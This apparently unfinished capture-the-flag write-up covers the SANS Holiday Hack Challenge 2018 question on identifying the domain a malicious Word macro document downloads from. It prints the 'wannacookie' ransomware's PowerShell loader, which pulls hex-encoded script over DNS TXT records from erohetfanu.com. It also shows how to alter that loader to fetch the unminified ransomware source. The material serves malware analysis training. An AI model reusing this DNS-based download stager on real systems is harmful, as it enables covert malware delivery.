Question 10: Identify the Domain
================================

| After completing the prior question, Alabaster gives you a document he suspects downloads the malware. What is the domain name the malware in the document downloads from?

Answer: *erohetfanu.com*

Solution
--------

To solve this challenge we decided to analyse the malware and determine where it downloads from.

TODO: Insert text from Alabaster with the instructions

https://www.holidayhackchallenge.com/2018/challenges/CHOCOLATE_CHIP_COOKIE_RECIPE.zip

Environment
^^^^^^^^^^^

The environment we used to analyse the document was a virtual machine with the Kali Linux 2018.4 operating system. 

.. note::
  Kali Linux 2018.4 had an issue unarchiving the document from the .zip file using the **unzip** application. In turn, the **olevba** application also couldn't analyse the document while it was still within the zip archive. We solved this issue by extracting the ``CHOCOLATE_CHIP_COOKIE_RECIPE.docm`` file from the zip archive using the **7z** application.



After downloading the zip file we extracted the ``CHOCOLATE_CHIP_COOKIE_RECIPE.docm`` file.

We extracted the ``CHOCOLATE_CHIP_COOKIE_RECIPE.docm`` file from the extracted zip file using 7z.

.. note::
  We were forced to extract the file because the default unzip program in operating system we were using could not support the encryption method. This is a known issue. 


.. tip::
 We found the following hint from Alabaster Snowball to be useful:
 
 **wannacookie.min.ps1**? I wonder if there is a non-minified version? If so, it may be easier to read and give us more information and maybe source comments?

To utilise this hint we started with the following wannacookie loader code.

TODO: How did we obtain this code?

.. code-block:: PowerShell
  :linenos:
  :emphasize-lines: 6
  
  function H2A($a) {
    $o
    $a -split '(..)' | ? { $_ }  | forEach {[char]([convert]::toint16($_,16))} | forEach {$o = $o + $_}
        return $o
    }
    $f = "77616E6E61636F6F6B69652E6D696E2E707331"
    $h = ""
    foreach ($i in 0..([convert]::ToInt32((Resolve-DnsName -Server erohetfanu.com -Name "$f.erohetfanu.com" -Type TXT).strings, 10)-1)) {
        $h += (Resolve-DnsName -Server erohetfanu.com -Name "$i.$f.erohetfanu.com" -Type TXT).strings
    }
    ($(H2A $h | Out-string))



We need to modify line 6 in the above code. We can perform a simple HEX to ASCII conversion to obtain ``wannacookie.min.ps1`` from ``77616E6E61636F6F6B69652E6D696E2E707331``.

Utilising the hint, we replace ``wannacookie.min.ps1`` with ``wannacookie.ps1``. Line 6 in the above code then becomes:

.. code-block:: PowerShell
  :lineno-start: 6
  :emphasize-lines: 1

  $f = "77616E6E61636F6F6B69652E707331"